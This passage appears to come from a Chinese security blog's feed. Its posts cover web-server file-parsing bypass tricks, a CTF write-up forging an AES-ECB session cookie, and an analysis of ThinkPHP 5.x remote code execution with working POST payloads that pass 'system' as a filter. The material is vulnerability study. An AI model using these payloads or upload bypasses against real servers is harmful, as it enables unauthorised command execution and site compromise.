    <link href="/2019/04/23/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    <url>/2019/04/23/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为搞站中碰到了一起解析漏洞的站，所以对此总结一下所有解析漏洞</p><a id="more"></a><h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h3 id="IIS5-x-6-0"><a href="#IIS5-x-6-0" class="headerlink" title="IIS5.x/6.0"></a>IIS5.x/6.0</h3><h4 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h4><p>目录名包含<code>.asp .asa .cer</code>这种字样，该文件夹下所有的文件均可以当作asp来解析</p><h4 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h4><p>以为服务器不解析;后的内容，所以<code>/xx.asp;.jpg</code>可以被当作asp来解析</p><h4 id="IIS特殊后缀名"><a href="#IIS特殊后缀名" class="headerlink" title="IIS特殊后缀名"></a>IIS特殊后缀名</h4><ul><li>asa</li><li>cer</li><li>cdx</li></ul><h3 id="IIS7-0-IIS7-5"><a href="#IIS7-0-IIS7-5" class="headerlink" title="IIS7.0/IIS7.5"></a>IIS7.0/IIS7.5</h3><p>默认fast-cgi开启状况下，在一个文件路径后面加上/xx.php会将原来的文件解析为php文件</p><p>如：<code>test.jpg/.php</code>会被当做php来执行</p><h2 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h2><h3 id="畸形解析漏洞"><a href="#畸形解析漏洞" class="headerlink" title="畸形解析漏洞"></a>畸形解析漏洞</h3><p>默认fast-cgi开启状况下，在一个文件路径后面加上/xx.php会将原来的文件解析为php文件</p><p>如：<code>test.jpg/.php</code>会被当做php来执行</p><h3 id="空字节代码执行"><a href="#空字节代码执行" class="headerlink" title="空字节代码执行"></a>空字节代码执行</h3><p>在fast-cgi关闭的情况下，nginx版本:0.5.<em>, 0.6.</em>, 0.7- 0.7.65, 0.8 -0.8.37，nginx在图片后附加php代码然后通过访问<code>xxx.jpg%00.php</code>来达到代码执行的目的</p><h3 id="文件名逻辑漏洞"><a href="#文件名逻辑漏洞" class="headerlink" title="文件名逻辑漏洞"></a>文件名逻辑漏洞</h3><p>受影响的nginx版本: 0.8.41至1.4.3和1.5.7之前的1.5.x 正常上传一个附加代码的图片”test.jpg”，访问时后面+”空格”+”\0”+”.php”，即让图片作为php文件解析</p><p><code>/test.jpg \0.php</code></p><h3 id="配置不当造成的目录穿越"><a href="#配置不当造成的目录穿越" class="headerlink" title="配置不当造成的目录穿越"></a>配置不当造成的目录穿越</h3><p>如果绝对路径”/home/“的URL映射是网站目录”/les/“，配置写成了”/les”</p><pre><code>location /files { alias /home/;}</code></pre><p>就可以访问”/les../“，穿越路径，访问到绝对路径根目录”/“下的文件列表</p><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>Apache从右向左解析，后缀不可识别就向左。因此<code>test.php.xxx</code>被当作php进行执行</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="Windows保留字"><a href="#Windows保留字" class="headerlink" title="Windows保留字"></a>Windows保留字</h3><p>windows文件夹名不允许出现以下字符</p><p><code>\ / : * ? &quot; &lt; &gt; |</code></p><h3 id="被去除的符号"><a href="#被去除的符号" class="headerlink" title="被去除的符号"></a>被去除的符号</h3><p>  windows不允许[空格]和[.]的存在，会默认去除，所以test.php和test.php.将会是一个文件</p><h3 id="长文件名截取"><a href="#长文件名截取" class="headerlink" title="长文件名截取"></a>长文件名截取</h3><p>Windows最长文件名为255，超出将被截取</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>解析漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web-crypto</title>
    <link href="/2019/03/06/web-crypto/"/>
    <url>/2019/03/06/web-crypto/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近做了一个ctf，里面碰到了一道web-crypro的题(你说你考的是crypro关我web什么事)。当时没有做出来，现在复盘。也是因为看了神仙writeup才有这个能力</p><a id="more"></a><h2 id="ctf"><a href="#ctf" class="headerlink" title="ctf"></a>ctf</h2><p>这是bsidessf举办的一场ctf，他们的官网如下：<br><a href="https://bsidessf.org/" target="_blank" rel="noopener">https://bsidessf.org/</a><br>题目的主界面如下：<br><img src="//images/web-crypto-Snipaste_2019-03-06_15-09-34.png" alt=""><br>也没有其他功能，尝试登陆，登陆成功：<br><img src="/images/web-crypto-Snipaste_2019-03-06_15-10-45.png" alt=""><br>这里无论什么账号密码都可以登陆。<br>登陆后提示现实我们需要设置is_admin的值为1，这里is_admin默认值为0，我们尝试修改，再次登陆<br><img src="/images/web-crypto-Snipaste_2019-03-06_15-13-33.png" alt=""><br>发现并没有成功，看来不是该前端能解决的(这都能解决也对不起它的分值)。<br>尝试抓包，发下如下两个可疑包：<br><img src="/images/web-crypto-Snipaste_2019-03-06_15-22-42.png" alt=""><br><img src="/images/web-crypto-Snipaste_2019-03-06_15-22-49.png" alt=""><br>分析其功能，就是在登陆的时候发送请求会返回一个名为user的cookie数据，然后再用cookie进行验证，就会的到之前的登录后的界面。<br>看来这道题的问题就出在了user这个数据上了。<br>尝试着把user的值拿出来放到加解密的网站，未果；再放入自己珍藏的脚本中，还是未果！！！<br>对它的仅有了解就是它的位数是32的倍数！<br>emmmmmmmmmmmmmm。。。。<br>这里我学到了一个好的思路：<br><strong>任何一个数据点，都可以用错误的数据去尝试</strong><br>尝试更改user值，就改一个数字，看会出现什么情况：<br><img src="/images/web-crypto-Snipaste_2019-03-06_15-33-27.png" alt=""><br><img src="/images/web-crypto-Snipaste_2019-03-06_15-35-19.png" alt=""><br>果然，出现了信息。<br>分析得到user信息是通过加密得到的json数据。<br>json数据应该是这样的：<br><code>{&quot;first_name&quot;:&quot;root&quot;,&quot;last_name&quot;:&quot;root&quot;,&quot;is_admin&quot;:0}</code><br>更改一位数据只影响一部分数据，应该是AES(ECB)加密。<br>AES(ECB)加密是先分组，再用密钥进行分别加密。在这里由于user的值为32的倍数，猜测分组值为32。尝试更改第33位的值：<br><img src="/images/web-crypto-Snipaste_2019-03-06_15-43-28.png" alt=""><br>发现32位加密字符串对应16位源字符串。<br>这样我们就可以自定义加密字符了。<br>根据题目提示，我们需要将is_admin设置为1，那么我们的源字符串应该为：<br><code>{&quot;first_name&quot;:&quot;root&quot;,&quot;last_name&quot;:&quot;root&quot;,&quot;is_admin&quot;:1}</code><br>按照分组规则，剩下的字符串应该为<code>n&quot;:1}</code><br>尝试将剩下缺少部分用0补齐：n&quot;:1}00000000000<br>再用注册功能加密：<br><img src="/images/web-crypto-Snipaste_2019-03-06_16-00-50.png" alt=""><br>得到payload字符串：<code>2fd57d817569589a9f068267ac906cf1</code><br>再替换掉原本字符串的后32位，发送：<br><img src="/images/web-crypto-Snipaste_2019-03-06_16-02-54.png" alt=""><br>简直了，你们能再丧心病狂点吗，这里都要过滤。<br>尝试绕过，未果。<br>那么就只有不引入过滤字符了。<br>在这里，我们尝试将is_admin值之前的数据凑够64位，这样，我们的payload就只有1这个数值，不会存在过滤符号，这样我们的user源数据应为：<br><code>{&quot;first_name&quot;:&quot;root&quot;,&quot;last_name&quot;:&quot;rootqqqqqqqqqqqqq&quot;,&quot;is_admin&quot;:1.0000000000000}</code><br>经过构造payload，得到加密payload，得flag：<br><img src="/images/web-crypto-Snipaste_2019-03-06_16-35-21.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>thinkphp5.0-1远程代码执行漏洞分析</title>
    <link href="/2019/03/03/thinkphp5-0-1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2019/03/03/thinkphp5-0-1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近看到了thinkphp5最新爆出来的代码执行漏洞，于是便跟着一起学习一下。</p><a id="more"></a><h2 id="thinkphp5-1-远程代码执行"><a href="#thinkphp5-1-远程代码执行" class="headerlink" title="thinkphp5.1.* 远程代码执行"></a>thinkphp5.1.* 远程代码执行</h2><h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>thinkphp5.1.* 版本</p><h3 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h3><p>thinkphp5 设置 error_reporting(0)</p><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><p>thinkphp5.1.31+php7.2.10+apache</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞文件：\thinkphp\library\think\Request.php<br>漏洞代码如下：</p><pre><code>public function method($origin = false)    {        if ($origin) {            // 获取原始请求类型            return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;        } elseif (!$this-&gt;method) {            if (isset($_POST[$this-&gt;config[&#39;var_method&#39;]])) {                $this-&gt;method    = strtoupper($_POST[$this-&gt;config[&#39;var_method&#39;]]);                $method          = strtolower($this-&gt;method);                        $this-&gt;{$method} = $_POST;            } elseif ($this-&gt;server(&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;)) {                $this-&gt;method = strtoupper($this-&gt;server(&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;));            } else {                $this-&gt;method = $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;            }        }        return $this-&gt;method;    }</code></pre><p>在这里存在一个经典的变量覆盖漏洞点<br><code>$this-&gt;method    = strtoupper($_POST[$this-&gt;config[&#39;var_method&#39;]]);</code><br>var_method=_method的值，即POST的_method值会赋值给$this-&gt;method。<br>同时，由<code>$this-&gt;{$method} = $_POST</code>，得$this-&gt;method 会得到 POST的值。<br>举个例子，假如我们POST的数据为a=aaa&amp;b=bbb&amp;_method=www，那么经过method方法后，我们就会得到一个$www变量，它的值为{‘a’=&gt;’aaa’,’b’=&gt;’bbb’,’_method’=&gt;’www’}<br>那么在这里，我们可以控制_method的值，来达到覆盖request.php里任意变量的目的。<br>这里就要提到一个利用函数了：filterValue()<br>代码如下：</p><pre><code>private function filterValue(&amp;$value, $key, $filters)    {        $default = array_pop($filters);        foreach ($filters as $filter) {            if (is_callable($filter)) {                // 调用函数或者方法过滤                $value = call_user_func($filter, $value);            }        ······        return $value;    }</code></pre><p>这个函数的作用是针对每一个$value值，用$filters进行过滤。<br>在这里$filters的值就是$filter的值，如果我们之前POST的_method=filter，那么我们就会覆盖$filter原本的值为我们POST的数据。<br>而foreach将$filter的值遍历出来带入<br><code>$value = call_user_func($filter, $value)</code>中执行。<br>如果我们POST中的数据带有危险函数如system、exec，那么就可以带入call_user_func中进行执行。<br>而执行的对象为$value。在这里，$value的值为request传入的数据，即我们传入的参数值。我们即可带入危险命令进入函数执行。<br>这里分析一下大概的流程</p><ul><li>通过_method变量进行变量覆盖</li><li>在变量覆盖的时候覆盖filter变量，同时传入危险函数名，在call_user_func函数中充当$filter值</li><li>在传递变量时，传入危险命令，在call_user_func函数中充当$value值</li></ul><p>经过全局搜索，我们在route.php里找到如下调用：</p><pre><code>public static function check($request, $url, $depr = &#39;/&#39;, $checkDomain = false)    {        ······        $method = strtolower($request-&gt;method());        // 获取当前请求类型的路由规则        ······</code></pre><p>继续向上，发现app.php里有对route::check()的调用：</p><pre><code>public static function routeCheck($request, array $config)    {        ······        // 路由检测（根据路由定义返回不同的URL调度）        $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);        ······</code></pre><p>而routeCheck在app::run()里存在调用<br>所以我们得出一条调用链：<br>index.php -&gt; start.php -&gt; app.php(app::run()) -&gt; app.php(app::routeCheck()) -&gt; route.php(Route::check()) -&gt; request.php(request::method())<br>之后，thinkphp会处理请求参数，进而对reqeust-&gt;filterValue()进行调用<br>通过上述分析，我们即可得到POC：<br><code>a=system&amp;b=whoami&amp;_method=filter</code><br>测试效果图如下：<br><img src="/images/thinkphp-Snipaste_2019-03-01_16-55-42.png" alt=""><br>其实在这里，变量名a、b根本不重要，同时，变量b也可以是GET参数，如：<br><img src="/images/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-Snipaste_2019-03-01_16-58-13.png" alt=""><br>须得注意的是，由于filter被覆盖，程序会抛出一个警告错误，如果不设置error_reporting(0)的话，程序会终止，无法达到代码执行的目的。</p><p>另外，这个漏洞针对thinkphp5.0.2-5.0.12也是成立的。</p><h2 id="thinkphp5-0-12代码执行"><a href="#thinkphp5-0-12代码执行" class="headerlink" title="thinkphp5.0.12代码执行"></a>thinkphp5.0.12代码执行</h2><h3 id="漏洞版本-1"><a href="#漏洞版本-1" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>thinkphp5.0.0-5.0.12</p><h3 id="复现环境-1"><a href="#复现环境-1" class="headerlink" title="复现环境"></a>复现环境</h3><p>thinkphp5.0.10+php-7.2.10+apache</p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在thinkphp5.0.12版本中，method方法不同与5.1版本，它的代码形式是这样的：</p><pre><code>public function method($method = false)    {        if (true === $method) {            // 获取原始请求类型            return IS_CLI ? &#39;GET&#39; : (isset($this-&gt;server[&#39;REQUEST_METHOD&#39;]) ? $this-&gt;server[&#39;REQUEST_METHOD&#39;] : $_SERVER[&#39;REQUEST_METHOD&#39;]);        } elseif (!$this-&gt;method) {            if (isset($_POST[Config::get(&#39;var_method&#39;)])) {                $this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]);                $this-&gt;{$this-&gt;method}($_POST);            } elseif (isset($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;])) {                $this-&gt;method = strtoupper($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;]);            } else {                $this-&gt;method = IS_CLI ? &#39;GET&#39; : (isset($this-&gt;server[&#39;REQUEST_METHOD&#39;]) ? $this-&gt;server[&#39;REQUEST_METHOD&#39;] : $_SERVER[&#39;REQUEST_METHOD&#39;]);            }        }        return $this-&gt;method;    }</code></pre><p>依旧是$this-&gt;method 的值来源于 POST参数_method。<br>而下一语句代码：<code>$this-&gt;{$this-&gt;method}($_POST);</code>，表示将执行名为$this-&gt;method的函数，参数值为$_POST。<br>所以说，我们可以通过控制_method的值来达到执行reques里的任意函数的目的。<br>通过5.1.*版本的漏洞，我们知道，在request.php里，要达到代码执行的目的，须通过filterValue里的call_user_func函数实现。向前溯源，即须通过变量覆盖将$filter的值设为危险函数名，我们才可实现。<br>其实在5.0.12版本中，filterValue函数基本无差异：</p><pre><code>private function filterValue(&amp;$value, $key, $filters)    {        $default = array_pop($filters);        foreach ($filters as $filter) {            if (is_callable($filter)) {                // 调用函数或者方法过滤                $value = call_user_func($filter, $value);            } elseif (is_scalar($value)) {                if (false !== strpos($filter, &#39;/&#39;)) {                    // 正则过滤      ······</code></pre><p>基于这个目的，我们将目光放在这个函数上：__constract()<br>代码如下：</p><pre><code>protected function __construct($options = [])    {        foreach ($options as $name =&gt; $item) {            if (property_exists($this, $name)) {                $this-&gt;$name = $item;            }        }        if (is_null($this-&gt;filter)) {            $this-&gt;filter = Config::get(&#39;default_filter&#39;);        }        // 保存 php://input        $this-&gt;input = file_get_contents(&#39;php://input&#39;);    }</code></pre><p>在这段代码中，函数通过foreach循环，将$options中的值分离出来，用propeprty_exists检查$this是否存在$item属性，如果存在，则对它进行赋值。<br>如果我们POST的数据如下：<br><code>_method=__construct&amp;filter=system</code><br>那么，我们就可以根据method方法进入__constract函数中。再由foreach检查是this是否存在_method和filter属性，对其分别赋值。<br>至此，我们就找到了对$filter变量进行控制的方法了。<br>再控制$value为危险函数命令，即可进行代码执行<br>总结一下流程：</p><ul><li>_method数据控制进入__constract函数</li><li>$_POST数据对$filte变量进行赋值使之为危险函数</li><li>$request 控制危险函数命令</li></ul><p>调用流程跟上一个一样<br>index.php -&gt; start.php -&gt; app.php(app::run()) -&gt; app.php(app::routeCheck()) -&gt; route.php(Route::check()) -&gt; request.php(request::method()) -&gt; reqeust.php(request::__constract())<br>所以，poc如下：<br><code>a=whoami&amp;_method=__construct&amp;filter=system</code><br>效果如下：<br><img src="/images/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-Snipaste_2019-03-01_22-12-04.png" alt=""><br>在此次，$value依旧是任意request值，所以，GET数据依然有效：<br><img src="/images/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-Snipaste_2019-03-01_22-13-56.png" alt="">  </p><h2 id="thinkphp5-0-23核心板代码执行"><a href="#thinkphp5-0-23核心板代码执行" class="headerlink" title="thinkphp5.0.23核心板代码执行"></a>thinkphp5.0.23核心板代码执行</h2><h3 id="漏洞版本-2"><a href="#漏洞版本-2" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>thinkphp5.0.13-5.0.23</p><h3 id="复现环境-2"><a href="#复现环境-2" class="headerlink" title="复现环境"></a>复现环境</h3><p>thinkphp5.0.23核心版+php7.2.10+apache</p><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在之前的两个版本中，漏洞实现的核心都是通过</p><ul><li>request.php的method方法进行变量覆盖，</li><li>调用filterValue进行代码执行。</li></ul><p>无论中间的步骤如何，最核心的步骤都是这两个。<br>但是在thinkphp5.0.13后，在app.php中新增了如下代码：</p><pre><code>public static function module($result, $config, $convert = null)    {      ······      // 设置默认过滤机制        $request-&gt;filter($config[&#39;default_filter&#39;]);      ······</code></pre><p>我们来回顾一下之前的调用流程：<br>index.php -&gt; start.php -&gt; app.php(app::run()) -&gt; app.php(app::routeCheck()) -&gt; route.php(Route::check()) -&gt; request.php(request::method())<br>在之前版本的代码中，我们在method的方法中对变量进行覆盖。<br>但是，在之后版本中，由于在thinkphp处理请求参数之前，调用了app::module()，对$filter进行了重定义，将我们覆盖的值又进行覆盖。<br>所以之前版本的利用流程不可用，需要更新利用方式。<br>在这个版本的代码中，我们要通过method()变量覆盖达到代码执行的目的，需要满足两个条件：</p><ul><li>调用reqeust::method()</li><li>在app:module()执行之前调用requeest::filterValue()  </li></ul><p>经过查找，发现request::param()对method()进行了调用：</p><pre><code>public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;mergeParam)) {            $method = $this-&gt;method(true);            // 自动获取请求变量            ······    }</code></pre><p>method参数为true，会进入request::server()</p><pre><code>public function method($method = false)    {        if (true === $method) {            // 获取原始请求类型            return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;        ······    }</code></pre><p>进入server方法：</p><pre><code>public function server($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        if (empty($this-&gt;server)) {            $this-&gt;server = $_SERVER;        }        if (is_array($name)) {            return $this-&gt;server = array_merge($this-&gt;server, $name);        }        return $this-&gt;input($this-&gt;server, false === $name ? false : strtoupper($name), $default, $filter);    }</code></pre><p>继续进入input方法：</p><pre><code>public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    {        ······        // 解析过滤器        $filter = $this-&gt;getFilter($filter, $default);        if (is_array($data)) {            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);            reset($data);        } else {            $this-&gt;filterValue($data, $name, $filter);        }        ······    }</code></pre><p>在此处，依次跟踪传入参数，如下：</p><ul><li>$this-&gt;server(‘REQUEST_METHOD’) -&gt; requuest::server()</li><li>$this-&gt;server,$this-&gt;server(‘REQUEST_METHOD’) -&gt; request::input()</li></ul><p>在input方法中，有如下一段代码：</p><pre><code>foreach (explode(&#39;.&#39;, $name) as $val) {                if (isset($data[$val])) {                    $data = $data[$val];                } else {                    // 无输入数据，返回默认值                    return $default;                }            }</code></pre><p>可以看出，$data即为server[‘REQUEST_METHOD’]的值。<br>然后，$data进入$this-&gt;filterValue函数：<br><code>$this-&gt;filterValue($data, $name, $filter);</code><br>拉通来看，即在param函数中，对server[‘REQUEST_METHOD’]中的值调用了一次filterValue方法。<br>在app.php中，存在如下代码：</p><pre><code>// 记录路由和请求信息            if (self::$debug) {                Log::record(&#39;[ ROUTE ] &#39; . var_export($dispatch, true), &#39;info&#39;);                Log::record(&#39;[ HEADER ] &#39; . var_export($request-&gt;header(), true), &#39;info&#39;);                Log::record(&#39;[ PARAM ] &#39; . var_export($request-&gt;param(), true), &#39;info&#39;);            }</code></pre><p>即程序开启debug模式，会调用一次$request-&gt;param()函数。<br>满足了漏洞利用的条件。<br>所以，poc如下：<br><code>_method=__construct&amp;filter=system&amp;server[REQUEST_METHOD]=whoami</code><br>效果如下：<br><img src="/images/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-Snipaste_2019-03-03_15-16-46.png" alt="">  </p><h2 id="thinkphp5-0-23完整版代码执行"><a href="#thinkphp5-0-23完整版代码执行" class="headerlink" title="thinkphp5.0.23完整版代码执行"></a>thinkphp5.0.23完整版代码执行</h2><h3 id="漏洞版本-3"><a href="#漏洞版本-3" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>thinkphp5.0.0-thinkphp5.0.23</p><h3 id="复现环境-3"><a href="#复现环境-3" class="headerlink" title="复现环境"></a>复现环境</h3><p>thinkphp5.0.23完整版+php7.2.10+apache</p><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>上一个漏洞分析讲过，漏洞利用有两个条件：</p><ul><li>调用reqeust::method()</li><li>在app:module()执行之前调用requeest::filterValue()</li></ul><p>但其实，如果app::module()方法不执行，一样可以达成目的。<br>分析一下为什么要执行app::module()方法？<br>在app::run()中看到如下代码：<br><code>$data = self::exec($dispatch, $config);</code><br>跟进exec()方法：</p><pre><code>protected static function exec($dispatch, $config)    {        switch ($dispatch[&#39;type&#39;]) {            case &#39;redirect&#39;: // 重定向跳转                $data = Response::create($dispatch[&#39;url&#39;], &#39;redirect&#39;)                    -&gt;code($dispatch[&#39;status&#39;]);                break;            case &#39;module&#39;: // 模块/控制器/操作                $data = self::module(                    $dispatch[&#39;module&#39;],                    $config,                    isset($dispatch[&#39;convert&#39;]) ? $dispatch[&#39;convert&#39;] : null                );                break;            case &#39;controller&#39;: // 执行控制器操作                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);                $data = Loader::action(                    $dispatch[&#39;controller&#39;],                    $vars,                    $config[&#39;url_controller_layer&#39;],                    $config[&#39;controller_suffix&#39;]                );                break;            case &#39;method&#39;: // 回调方法                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);                $data = self::invokeMethod($dispatch[&#39;method&#39;], $vars);                break;                ······    }</code></pre><p>在这里面，我们看到了熟悉的param()方法，这个方法就是导致5.0.23核心版代码执行的罪魁祸首。<br>同时，由<code>switch ($dispatch[&#39;type&#39;])</code>可知，如果我们控制了$dispatch[‘type’]的值，就可以控制exec()方法执行的函数，就可以达成跳过app::module()方法的目的。<br>再来溯源$dispatch变量：<br>在app::run()中：</p><pre><code>if (empty($dispatch)) {                $dispatch = self::routeCheck($request, $config);            }</code></pre><p>进入routeCheck()方法中：</p><pre><code>public static function routeCheck($request, array $config)    {        $path   = $request-&gt;path();        $depr   = $config[&#39;pathinfo_depr&#39;];        $result = false;        ······        // 路由检测（根据路由定义返回不同的URL调度）        $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);        $must   = !is_null(self::$routeMust) ? self::$routeMust : $config[&#39;url_route_must&#39;];        if ($must &amp;&amp; false === $result) {            // 路由无效            throw new RouteNotFoundException();        }        ···        return $result;    }</code></pre><p>返回值$result跟$Route::check()有关，继续跟进：</p><pre><code>public static function check($request, $url, $depr = &#39;/&#39;, $checkDomain = false)    {        ······        $method = strtolower($request-&gt;method());        // 获取当前请求类型的路由规则        $rules = isset(self::$rules[$method]) ? self::$rules[$method] : [];        // 检测域名部署        ······        // 路由规则检测        if (!empty($rules)) {            return self::checkRoute($request, $rules, $url, $depr);        }        return false;    }</code></pre><p>在这里，又一次执行了我们熟悉的$request-&gt;method()方法。<br>在method()方法中，我们进行了一次变量覆盖。<br>同时，由<br><code>$this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]);</code><br><code>return $this-&gt;method;</code><br>可知我们得到的时$method的值。同时，$rules获得名为$method的路由规则。<br>跟进route::checkRoute():</p><pre><code>private static function checkRoute($request, $rules, $url, $depr = &#39;/&#39;, $group = &#39;&#39;, $options = [])    {        foreach ($rules as $key =&gt; $item) {            ······            if (is_array($rule)) {                ······                $result = self::checkRule($rule, $route, $url, $pattern, $option, $depr);                if (false !== $result) {                    return $result;                }            }        }        ······    }</code></pre><p>经过试调，$result值来源于self::checkRule()方法，继续跟进：</p><pre><code>private static function checkRule($rule, $route, $url, $pattern, $option, $depr)    {        ······        if ($len1 &gt;= $len2 || strpos($rule, &#39;[&#39;)) {            ······            if (false !== $match = self::match($url, $rule, $pattern)) {                // 匹配到路由规则                return self::parseRule($rule, $route, $url, $option, $match);            }        }        return false;    }</code></pre><p>此处，返回的值与self::parseRule()有关，继续跟进：</p><pre><code>private static function parseRule($rule, $route, $pathinfo, $option = [], $matches = [], $fromCache = false)    {        ······            elseif (false !== strpos($route, &#39;\\&#39;)) {            // 路由到方法            list($path, $var) = self::parseUrlPath($route);            $route            = str_replace(&#39;/&#39;, &#39;@&#39;, implode(&#39;/&#39;, $path));            $method           = strpos($route, &#39;@&#39;) ? explode(&#39;@&#39;, $route) : $route;            $result           = [&#39;type&#39; =&gt; &#39;method&#39;, &#39;method&#39; =&gt; $method, &#39;var&#39; =&gt; $var];        }        ······        return $result;    }</code></pre><p>可以看到，只要满足false ！== strpos($route, ‘\\‘)，就可以进入路由到方法，控制dispatch[‘type’]值为method，从而进入app::exec()方法中的method()回调方法，执行<code>Request::instance()-&gt;param()</code>，达成利用条件。<br>在完整版中，thinkphp多了一些东西：<br><img src="/images/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-Snipaste_2019-03-03_18-32-13.png" alt=""><br>在\topthink\think-captcha\src\helper.php中存在：<br><code>\think\Route::get(&#39;captcha/[:id]&#39;, &quot;\\think\\captcha\\CaptchaController@index&quot;);</code><br>这里调用\think\route::get进行路由注册，而在我们跟踪流程中发现在$Route::check()中可以通过覆盖$mthod值达到获取任意名为$method的路由规则。<br>如果我们覆盖$method的值为get，就会获得get类型的路由，再传入参数值为captcha，即可获得上面的路由规则：<code>\\think\\captcha\\CaptchaController@index</code>。<br>刚好符合进入路由到方法的条件。<br>再通过层层返回，可以进入app::exec()中的method回调方法，执行<code>Request::instance()-&gt;param</code>。<br>所以，poc如下：</p><pre><code>POST /thinkphp_5.0.23_with_extend/public/index.php?s=captcha HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 74_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><p>效果如下：<br><img src="/images/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-Snipaste_2019-03-03_18-43-16.png" alt=""></p><h2 id="变异poc"><a href="#变异poc" class="headerlink" title="变异poc"></a>变异poc</h2><p>网上的大佬太多了，一个个的poc骚到不行，这里再贴一条大佬的变异poc：<br><code>_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></p><h2 id="个人想法"><a href="#个人想法" class="headerlink" title="个人想法"></a>个人想法</h2><ul><li>这四个版本的漏洞，本质上都是由一个漏洞点引起的。无论是覆盖不同的函数，还是越过module()方法的执行，本身就是花式满足漏洞触发条件。由于thinkphp的灵活，关于这个漏洞点的利用方式应该不止我列举的这四种。就像完整版之于核心版，由于插件的富余，使之利用点多了一个。</li><li>其实，搞清楚具体的调用流程，对分析如何达成漏洞利用条件还是很有帮助的。就比如5.0.12版本之后的代码，由于module()方法对filterValue进行重定义，导致之前的poc链不成立。而通过分析thinkphp执行流程我们发现module()方法执行之前可以调用其他函数，也可以覆盖某些值以到达不执行module()函数。所以，调用流程的分析很有必要。</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>thinkphp5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>py脚本 - myinotify</title>
    <link href="/2019/02/26/py%E8%84%9A%E6%9C%AC%E4%B9%8Bmyinotify/"/>
    <url>/2019/02/26/py%E8%84%9A%E6%9C%AC%E4%B9%8Bmyinotify/</url>
    
